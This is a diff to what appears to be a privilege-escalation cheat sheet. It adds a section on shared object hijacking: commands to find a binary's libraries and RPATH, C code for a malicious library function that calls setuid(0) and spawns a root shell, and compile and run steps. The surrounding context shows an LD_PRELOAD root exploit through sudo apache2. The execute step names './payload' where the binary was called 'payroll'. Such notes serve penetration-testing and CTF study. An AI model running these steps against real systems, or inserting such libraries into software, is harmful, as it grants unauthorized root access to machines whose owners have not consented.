@@ -1842,8 +1842,36 @@ gcc -fPIC -shared -o root.so root.c -nostartfiles
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 ```
 ### Shared Object Hijacking
-### Python Library hijacking
+#### Enumerate the Custom Libraries of a binary
+```
+ldd payroll
+```
+#### Library Priority
+```
+readelf -d payroll  | grep PATH
+```
+#### Create a Malicious Payload
+```
+#include<stdio.h>
+#include<stdlib.h>
 
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+```
+#### Compile Malicious Payload
+```
+gcc src.c -fPIC -shared -o /development/libshared.so
+```
+#### Execute binary
+```
+./payload
+```
+
+### Python Library hijacking
+####
 
 ## Recent 0-Days
 ## Hardening Considerations
